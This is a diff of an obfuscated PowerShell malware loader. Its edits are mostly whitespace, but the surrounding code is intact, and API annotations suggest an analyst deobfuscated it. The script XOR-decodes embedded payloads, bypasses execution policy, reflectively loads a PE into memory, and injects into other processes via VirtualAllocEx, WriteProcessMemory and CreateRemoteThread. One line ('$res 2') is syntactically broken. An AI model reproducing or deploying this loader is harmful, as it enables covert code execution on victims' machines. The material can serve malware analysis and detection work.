@@ -21,7 +21,7 @@ Function DecodeData # Custom algorithm based on RC4 loop
     (
         [Parameter(Position = 0, Mandatory = $true)] [Int64] $datainput1,    
         [Parameter(Position = 1, Mandatory = $true)] [Int64] $datainput2
-   )
+    )
     [Byte[]]$ArrayBytes = [BitConverter]::GetBytes($datainput1)
     [Byte[]]$ArrayBytes2 = [BitConverter]::GetBytes($datainput2)
     [Byte[]]$result = [BitConverter]::GetBytes([UInt64]0)
@@ -36,12 +36,12 @@ Function DecodeData # Custom algorithm based on RC4 loop
 				$i += 256
 				$j = 1
 			}
-			else { $j = 0 }
+			else {$j = 0}
 			[UInt16]$val = $i - $ArrayBytes2[$inc]
 			$result[$inc] = $val -band 0x00FF
         }
-    }
-    else  { Throw }
+   }
+    else  {Throw}
     return [BitConverter]::ToInt64($result, 0)
 }
 Function CompareValue
@@ -50,7 +50,7 @@ Function CompareValue
     (
         [Parameter(Position = 0, Mandatory = $true)] [Int64] $datainput,    
         [Parameter(Position = 1, Mandatory = $true)] [Int64] $datainput2
-   )
+    )
     [Byte[]]$CompBytes1 = [BitConverter]::GetBytes($datainput)
     [Byte[]]$CompBytes2 = [BitConverter]::GetBytes($datainput2)
     [Byte[]]$result = [BitConverter]::GetBytes([UInt64]0)
@@ -61,10 +61,10 @@ Function CompareValue
         {
 			[UInt16]$val = $CompBytes1[$i] + $CompBytes2[$i] + $offset
 			$result[$i] = $val -band 0x00FF # 0x00FF -> 255
-			if (($val -band 0xFF00) -eq 0x100) { $offset = 1  }
-			else { $offset = 0 }
+			if (($val -band 0xFF00) -eq 0x100) {$offset = 1 }
+			else {$offset = 0}
         }
-    }
+   }
     return [BitConverter]::ToInt64($result, 0)
 }
 Function ConvertData
@@ -84,6 +84,7 @@ Function ReflectExec
     Param([OutputType([Type])]
    [Parameter(Position = 0)] [Type[]] $ArrayBytes = (New-Object Type[](0)),
    [Parameter(Position = 1)] [Type] $Void  = [Void])
+
     $refDomain = [AppDomain]::CurrentDomain
     $ReflectAssembly = New-Object Reflection.AssemblyName($("ReflectedDelegate"))
     $Exec = $refDomain.DefineDynamicAssembly($ReflectAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
@@ -103,10 +104,10 @@ function Injection
         [Parameter(Position = 1 , Mandatory = $true)] [IntPtr] $datainput2,
         [Parameter(Position = 2 , Mandatory = $true)] [UInt32] $stop,
         [Parameter(Position = 3 , Mandatory = $true)] [System.IntPtr] $refData
-   )
+    )
     $ref = 0xa000
-    if([System.IntPtr]::Size -eq 4) { $ref = 0x3000 }
-    if($stop -eq 0)  { return $false }
+    if([System.IntPtr]::Size -eq 4) {$ref = 0x3000}
+    if($stop -eq 0)  {return $false}
     $Array1 = DecodeData $datainput2 $refData
     $PtrAssembly = CompareValue $datainput1 $(ConvertData $stop)
     $MemBlock = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PtrAssembly,[Type][rAysT.THHoPEueqNhrPOcKa]) #Allocate .Net Assembly
@@ -129,7 +130,7 @@ function Injection
         }
         $PtrAssembly = CompareValue $PtrAssembly $(ConvertData $MemBlock.eIieW)
         $MemBlock = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PtrAssembly,[Type][rAysT.THHoPEueqNhrPOcKa])
-    }
+   }
     return $true
 }
 function PerformInjection
@@ -149,13 +150,13 @@ function PerformInjection
     {
         $s = $Win32FunctionsLoaded::OtaIoED(0, $Size, 12288, 0x04) # VirtualAlloc -> LPVOID VirtualAlloc(LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
         if ($s -ne 0)
-        {   $Proc = $Win32FunctionsLoaded::FMZmzgMkrG() # GetCurrentProcess
+        { $Proc = $Win32FunctionsLoaded::FMZmzgMkrG() # GetCurrentProcess
 			$mem = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($Proc, $s, $Buffer, $Size, [ref]([UInt32]0)) # WriteProcessMemory -> BOOL WriteProcessMemory(HANDLE hProcess,LPVOID lpBaseAddress,LPCVOID lpBuffer,SIZE_T nSize,SIZE_T *lpNumberOfBytesWritten);
 			if ($mem -eq $true)
-			{    
+			{  
 				$r = $Win32FunctionsLoaded::qRPmFXhkuFSN([IntPtr]$v, 0, $Size, 12288, 0x40) # VirtualAllocEx -> LPVOID VirtualAllocEx(HANDLE hProcess,LPVOID lpAddress,SIZE_T dwSize,DWORD flAllocationType,DWORD flProtect);
 				if ($r -ne 0)
-				{  
+				{
 					if ($condition -eq $false)
 					{
 						$struc = [System.Runtime.InteropServices.Marshal]::PtrToStructure($s,[Type][rAysT.TJVQm])
@@ -164,17 +165,17 @@ function PerformInjection
 					}
 					$mem = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($v, $r, $s, $Size, [ref]([UInt32]0)) # WriteProcessMemory
 					if ($mem -eq $true)
-					{       
+					{     
 						$Address = CompareValue $r $(ConvertData ($datainput))
 						$ResultInjection = $Win32FunctionsLoaded::XtSXrcJonvCMcGwm($v, 0, 0, $Address, 0, 0, 0) # CreateRemoteThread -> HANDLE CreateRemoteThread(HANDLE hProcess,LPSECURITY_ATTRIBUTES lpThreadAttributes,SIZE_T dwStackSize,LPTHREAD_START_ROUTINE lpStartAddress,LPVOID lpParameter,DWORD dwCreationFlags,LPDWORD lpThreadId);
-						if ($ResultInjection -ne 0) { $c.value = $true }
+						if ($ResultInjection -ne 0) {$c.value = $true}
 					}
 				}
 			}
 			$Win32FunctionsLoaded::xycvsJtyHgipAMmxSU($s, ([UInt32]0), 0x00008000) | Out-Null
         }
         $Win32FunctionsLoaded::ETFuUeRwmAyBqho($v) | Out-Null
-    }
+   }
     return
 }
 function Search-Injection
@@ -196,8 +197,8 @@ function Search-Injection
         {
 			$ProcessID = 0;
 			$b = $false
-            foreach ($modules in $p.modules) { if ($modules.filename -eq "wow64.dll") { $b = $true } }
-			if ($b -eq $false) { $ProcessID = $p.id }
+            foreach ($modules in $p.modules) {if ($modules.filename -eq "wow64.dll") {$b = $true}}
+			if ($b -eq $false) {$ProcessID = $p.id}
         }
 		if ($ProcessID -ne 0)
 		{
@@ -206,32 +207,32 @@ function Search-Injection
 				$i = 0
 				PerformInjection $ProcessID $Buffer $Size $datainput $condition ([ref]$i)
 				if ([bool]$i -eq $true)
-				{ 
+				{
 					$c.value = $true
 					break
 				}
 			}
 		}
-    }
+   }
 return 
 }
 [byte[]]$Array_bytes = 0
 $c = $false
 if ((Get-WmiObject Win32_processor).AddressWidth -eq 64)
-{      
+{    
     if ($env:PROCESSOR_ARCHITECTURE -ne "amd64")
     {
-        if ($myInvocation.Line) { &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit $myInvocation.Line }
-        else { &"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit -file "$($myInvocation.InvocationName)" $args }
+        if ($myInvocation.Line) {&"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit $myInvocation.Line}
+        else {&"$env:WINDIR\sysnative\windowspowershell\v1.0\powershell.exe" -ExecutionPolicy ByPass -NoLogo -NonInteractive -NoProfile -NoExit -file "$($myInvocation.InvocationName)" $args}
         exit $lastexitcode
     }
-    for($i = 0; $i -lt $payloadX64.Length; $i++) { $payloadX64[$i] = $payloadX64[$i] -bxor 0x6c }
+    for($i = 0; $i -lt $payloadX64.Length; $i++) {$payloadX64[$i] = $payloadX64[$i] -bxor 0x6c}
     [byte[]]$Array_bytes = $payloadX64
     $c = $true
 }
 else
 {
-    for($j = 0; $j -lt $payloadX86.Length; $j++) { $payloadX86[$j] = $payloadX86[$j] -bxor 0xec }
+    for($j = 0; $j -lt $payloadX86.Length; $j++) {$payloadX86[$j] = $payloadX86[$j] -bxor 0xec}
     [byte[]]$Array_bytes = $payloadX86
 }
 [System.IntPtr]$ptr1 = 0
@@ -242,17 +243,17 @@ try
     $ptr1 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($Array_bytes.Length)
     [System.Runtime.InteropServices.Marshal]::Copy($Array_bytes, 0, $ptr1, $Array_bytes.Length)
 }
-catch { return }
+catch {return}
 $ps = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ptr1,[Type][rAysT.TJVQm])
 $val = 0
-if ($c -eq $true) { $val = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp)), [Type][rAysT.TOJmBqYBQIhMwvvu]) }
-else { $val = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp)), [Type][rAysT.IqpYsflQR])}
+if ($c -eq $true) {$val = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp)), [Type][rAysT.TOJmBqYBQIhMwvvu])}
+else {$val = [System.Runtime.InteropServices.Marshal]::PtrToStructure($(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp)), [Type][rAysT.IqpYsflQR])}
 $ptr2 = $Win32FunctionsLoaded::OtaIoED(0, $val.qyNjiKGfawtIKvIG.RhYtihtdVKefK, 12288, 0x04) # VirtualAlloc
-if($ptr2 -eq 0){ return }
+if($ptr2 -eq 0){return}
 $r1 = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($InfoProc, $ptr2, $ptr1, $val.qyNjiKGfawtIKvIG.UkoFPlKhFvxm, [ref]([UInt32]0)) # WriteProcessMemory
-if ($r1 -eq $false) { return }
+if ($r1 -eq $false) {return}
 $r2 = $(CompareValue $ptr1 $(ConvertData $ps.IXKyZmBSAvp))
-if ($c -eq $true) { $r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.TOJmBqYBQIhMwvvu])) }
+if ($c -eq $true) {$r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.TOJmBqYBQIhMwvvu]))}
 else 
 {
     $r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.IqpYsflQR])) 
@@ -263,7 +264,7 @@ for($i= 0; $i-lt $val.OxUrqFJjjHiPyiO.TJVqg; $i++)
     $comp1  = CompareValue $ptr1 $(ConvertData $s1.UGBBTiwzy)
     $comp2 = CompareValue $ptr2 $(ConvertData $s1.XFRcUvLLUcEQ)
     $r1 = $Win32FunctionsLoaded::EsGWYPYhiZfpMKaJZV($InfoProc, $comp2, $comp1, $s1.WYPoTMpwmHa, [ref]([UInt32]0)) # WriteProcessMemory
-    if ($r1 -eq $false) { return }
+    if ($r1 -eq $false) {return}
     $r2 = CompareValue $r2 $([System.Runtime.InteropServices.Marshal]::SizeOf([Type][rAysT.dbLwD]))
 }
 $res = 0
@@ -273,7 +274,7 @@ if([bool]$res -ne $true)
     $res1 = $Win32FunctionsLoaded::cHRPUOi($InfoProc, $ptr2, $val.qyNjiKGfawtIKvIG.RhYtihtdVKefK, 0x40, 0) # VirtualProtectEx
     if ($res1 -eq $true)
     {
-        if ($c -eq $false) { Injection $ptr2 $ptr2 $val.qyNjiKGfawtIKvIG.YkQ.DTNy $(ConvertData $val.qyNjiKGfawtIKvIG.iYMKjeyaVrBrHnPWnWK)     }      
+        if ($c -eq $false) {Injection $ptr2 $ptr2 $val.qyNjiKGfawtIKvIG.YkQ.DTNy $(ConvertData $val.qyNjiKGfawtIKvIG.iYMKjeyaVrBrHnPWnWK)}      
         $refvalue = CompareValue $ptr2 $(ConvertData ($val.qyNjiKGfawtIKvIG.laonnCMgpT))
         $res 2 = ReflectExec @([System.IntPtr],[UInt32],[System.IntPtr]) ([bool])
         $prog = [Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($refvalue, $res 2)
